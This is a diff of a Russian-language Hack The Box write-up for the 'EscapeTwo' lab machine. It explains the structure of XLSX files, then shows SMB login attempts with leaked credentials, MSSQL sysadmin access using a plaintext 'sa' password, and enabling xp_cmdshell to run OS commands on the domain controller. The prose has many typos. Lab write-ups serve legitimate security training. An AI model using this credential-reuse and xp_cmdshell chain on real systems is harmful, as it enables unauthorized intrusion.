@@ -122,10 +122,9 @@ getting file \accounts.xlsx of size 6780 as accounts.xlsx (19.8 KiloBytes/sec) (
 Однако, если мы откроем эти файлы, мы обратим внимание, что их нельзя прочитать
 ![image](https://github.com/user-attachments/assets/b01b8248-33f1-4410-b522-407f5bbd3769)
 
-Чтоб понять, почему это происходит, и почему этот файл - это чрезвычайно важный файа, нам нужноработаться, как вообще работает **.xlsx** файлы. Фактически, формат **XLSX** - это сжатый архив состоящих из **XML** файлов, которые отвечают за структурированные данных в таблице: значения в ячейках, формулы, стили, настройки и т.д. 
+Чтоб понять, почему этот файл - это чрезвычайно важный файа, нам нужноработаться, как вообще работает **.xlsx** файлы. Фактически, формат **XLSX** - это сжатый архив состоящих из **XML** файлов, которые отвечают за структурированные данных в таблице: значения в ячейках, формулы, стили, настройки и т.д. 
 
 Таким образом, мы можем разархивировать эти файлы, и посмотреть содержание **XML** фалйов
-
 ```
 Hexada@hexada ~/app/escape-two/accounting_2024$ unzip ../accounting_2024.xlsx                                                                                                         9 ↵  
 Archive:  ../accounting_2024.xlsx
@@ -160,6 +159,7 @@ file #1:  bad zipfile offset (local header sig):  0
   inflating: [Content_Types].xml
 ```
 
+Нас интересует файл `sharedStrings.xml`, так как этот файл содержит уникальные строки текста, которые используются в ячейках Excel. Вместо того чтобы сохранять каждый текстовый элемент в каждой ячейке (что увеличивает размер файла), **Excel** сохраняет текстовые строки один раз в `sharedStrings.xml`. Ячейки, содержащие текст, ссылаются на индекс строки из этого файла
 ```xml
 <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24">
 <si><t xml:space="preserve">First Name</t></si>
@@ -193,8 +193,122 @@ file #1:  bad zipfile offset (local header sig):  0
 
 ![image](https://github.com/user-attachments/assets/ef7af5a8-5d32-4dcb-a74f-6c01f2e784d7)
 
+Но на самом деле, почему **XLSX** файлы имеют содержание на машином коде, я не знаю, на этом моменте я уперся в тупик и достаточно долго не знал что делать, пришлось пользоваться документацией по взлому этой машины. Теоритически кстати, если у нас есть поврежденый **XLSX**, мы, возможно, можем сделать абсолютно такой же алгоритм действий, чтоб извлечь важные для нас данные
+```
+Hexada@hexada ~/app/escape-two/accounts/xl$ smbclient -L //escape.two.htb -U 'angela'                                                                                               130 ↵  
+Password for [WORKGROUP\angela]:
+session setup failed: NT_STATUS_LOGON_FAILURE
+Hexada@hexada ~/app/escape-two/accounts/xl$
+```
 
+```
+Hexada@hexada ~/app/escape-two/accounts/xl$ smbclient -L //escape.two.htb -U 'oscar'                                                                                                130 ↵  
+Password for [WORKGROUP\oscar]:
 
+        Sharename       Type      Comment
+        ---------       ----      -------
+        Accounting Department Disk      
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      
+SMB1 disabled -- no workgroup available
+```
 
+```
+Hexada@hexada ~/app/escape-two/accounts/xl$ smbclient -L //escape.two.htb -U 'kevin'                                                                              
+Password for [WORKGROUP\kevin]:
+session setup failed: NT_STATUS_LOGON_FAILURE
+```
+
+```
+Hexada@hexada ~/app/escape-two/accounts/xl$ smbclient -L //escape.two.htb -U 'sa'                                                                                                     1 ↵  
+Password for [WORKGROUP\sa]:
+session setup failed: NT_STATUS_LOGON_FAILURE
+```
+
+Если обратить внимание на пароль пользователя `sa`, интуитивно мы можем понять, что через него мы можем подключиться к **MSSQL** (1433 порт)
+```
+Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python3 netexec.py mssql escape.two.htb -u sa -p MSSQLP@ssw0rd! --local-auth -M mssql_priv                               main
+
+MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
+MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@***** (Pwn3d!)
+MSSQL_PRIV  10.10.11.51     1433   DC01             [+] sa is already a sysadmin
+```
+
+```
+Hexada@hexada ~/app/escape-two$ mssqlclient.py sa@10.10.11.51 -p 1433                                                                                                               130 ↵  
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (sa  dbo@master)>
+```
+
+```
+SQL (sa  dbo@msdb)> sp_configure 'show advanced options', 1;
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+
+SQL (sa  dbo@msdb)> RECONFIGURE;
+```
+
+```
+SQL (sa  dbo@msdb)> sp_configure 'xp_cmdshell', 1;
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@msdb)> RECONFIGURE;
+```
+
+```
+SQL (sa  dbo@msdb)> enable_xp_cmdshell
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@msdb)> RECONFIGURE
+```
+
+```
+SQL (sa  dbo@msdb)> EXEC xp_cmdshell 'dir C:\';
+output                                                       
+----------------------------------------------------------   
+ Volume in drive C has no label.                             
+
+ Volume Serial Number is 3705-289D                           
+
+NULL                                                         
+
+ Directory of C:\                                            
+
+NULL                                                         
+
+11/05/2022  11:03 AM    <DIR>          PerfLogs              
+
+01/04/2025  07:11 AM    <DIR>          Program Files         
+
+06/09/2024  07:37 AM    <DIR>          Program Files (x86)   
+
+06/08/2024  02:07 PM    <DIR>          SQL2019               
+
+06/09/2024  05:42 AM    <DIR>          Users                 
+
+01/04/2025  08:10 AM    <DIR>          Windows               
+
+               0 File(s)              0 bytes                
+
+               6 Dir(s)   3,701,399,552 bytes free           
+
+NULL                                                         
+
+SQL (sa  dbo@msdb)> 
+```
+
+```
 
 
